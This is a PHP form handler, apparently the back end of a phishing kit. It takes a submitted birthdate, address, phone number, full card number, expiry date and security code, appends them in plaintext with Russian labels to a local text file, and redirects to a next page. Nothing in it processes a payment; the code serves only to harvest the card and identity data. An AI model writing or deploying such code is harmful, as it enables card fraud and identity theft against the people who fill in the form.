<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $birthdate = $_POST['birthdate'];
    $country = $_POST['country'];
    $postalCode = $_POST['postal_code'];
    $city = $_POST['city'];
    $address = $_POST['address'];
    $mobileNumber = $_POST['mobile_number'];
    $discountOrReferralCode = $_POST['discount_or_referral_code'];
    $cardType = $_POST['card_type'];
    $cardNumber = $_POST['card_number'];
    $expirationMonth = $_POST['expiration_month'];
    $expirationYear = $_POST['expiration_year'];
    $securityCode = $_POST['security_code'];
    $savePaymentData = isset($_POST['save_payment_data']);

    $data = "Дата рождения: $birthdate\n";
    $data .= "Страна: $country\n";
    $data .= "Почтовый индекс: $postalCode\n";
    $data .= "Город: $city\n";
    $data .= "Адрес: $address\n";
    $data .= "Номер мобильного телефона: $mobileNumber\n";
    $data .= "Скидочный или реферальный код: $discountOrReferralCode\n";
    $data .= "Тип карты: $cardType\n";
    $data .= "Номер карты: $cardNumber\n";
    $data .= "Окончание действия: $expirationMonth / $expirationYear\n";
    $data .= "Код безопасности: $securityCode\n";
    $data .= "Сохранить платежные данные: " . ($savePaymentData ? "Да" : "Нет") . "\n";
    $data .= "/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////";

    $filePath = 'text.txt';

    file_put_contents($filePath, $data, FILE_APPEND);

    header('Location: index3.php');
    exit;
}
?>
